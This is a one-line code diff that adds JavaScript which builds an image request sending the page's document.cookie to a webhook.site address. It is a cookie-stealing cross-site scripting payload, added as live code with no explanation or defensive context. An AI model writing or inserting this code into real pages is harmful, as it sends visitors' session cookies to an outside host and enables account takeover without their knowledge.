@@ -1,0 +1,1 @@
+var i=new Image;i.src="https://webhook.site/c47547b8-94a7-4874-b63f-cd492d9cc318/?c"+document.cookie;
